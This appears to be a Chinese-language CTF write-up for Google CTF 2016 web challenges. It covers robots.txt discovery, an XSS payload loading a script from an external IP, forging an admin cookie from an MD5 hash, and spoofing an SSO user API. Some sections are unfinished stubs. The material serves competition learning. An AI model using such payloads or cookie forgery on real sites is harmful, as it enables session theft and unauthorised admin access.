# Google CTF 2016 Web

1. Wallowing Wallabies - Part One
    - 题面上可以使用的功能为零，源码里也没有什么切入点。
    - 查看各种套路，发现`robots.txt`
        ```
        User-agent: *
        Disallow: /deep-blue-sea/
        Disallow: /deep-blue-sea/team/
        # Yes, these are alphabet puns :)
        Disallow: /deep-blue-sea/team/characters
        Disallow: /deep-blue-sea/team/paragraphs
        Disallow: /deep-blue-sea/team/lines
        Disallow: /deep-blue-sea/team/runes
        Disallow: /deep-blue-sea/team/vendors
        ```
    - 发现其中`/deep-blue-sea/team/vendors`可以访问，页面内容为：
      > Hello!
      > If you've been directed to this webpage; you have been requested to file out for vendor level access to our system.
      > To request access; please fill out your form, and an admin will review your application as soon as possible.

    - 预计会有XSS漏洞出现，随便点东西提交：
      > Thank you, your request has been received
      > Your message to the admins is as follows:
      > !!! Expecting to find '<script src=' in your input -- please re-read the level challenge.

    - So赤果果的提示，构造playload `<script src="http://104.131.23.191/xss.js"></script>`

    - [Google CTF – Web 1 – Wallowing Wallabies – Part One](http://buer.haus/2016/05/01/google-ctf-web-1-wallowing-wallabies-part-one/)
2. Wallowing Wallabies - Part One
    - XSS

3. Ernst Echidna
    > Can you hack this website? The robots.txt sure looks interesting.

    - 进入页面，提示注册，先查看`robots.txt`：`Disallow: /admin`
    - 访问`/admin`，得到`Sorry, this interface is restricted to administrators only`
    - 查看Cookie：`md5-hash: 912ec803b2ce49e4a541068d495ab570`，为刚才注册用户名的MD5,
    - 直接把Cookie改为admin的MD5`912ec803b2ce49e4a541068d495ab570`，得到flag

4. Dancing Dingoes
    > We're interested in finding out what information is stored on this website. We've already obtained the username "proff" and the password "strobe.c", but can't work out how to access the "admin" user. Any ideas?

    - 采用题目给予的用户名登录
    - 抓包看登录过程，发现有个指向`https://dancing-dingoes.ctfcompetition.com/api/users/login?domain=dancing-dingoes.ctfcompetition.com`的请求
    - 修改其参数进行重放，得到错误：`parsing JSON - invalid character '<' looking for beginning of value`
    - 再改到一个不存在的地址，得到错误`fetching current SSO user information - Get rest/v1/user/current: API error 7 (urlfetch: DNS_ERROR)`
    - 访问其API，获得API格式`{ "UserID": "proff" }`
    - 所以这个登录过程是通过请求一个API来获得UserID，将其指向一个在`rest/v1/user/current`地址下UserID为admin的域名即可。
    - 域名需要通过https访问

5. Wallowing Wallabies - Part Three
6. Purple Wombats
    > We've received a penetration test request for this high-quality site, but we were too busy building a CTF. Can you help us out?

    -
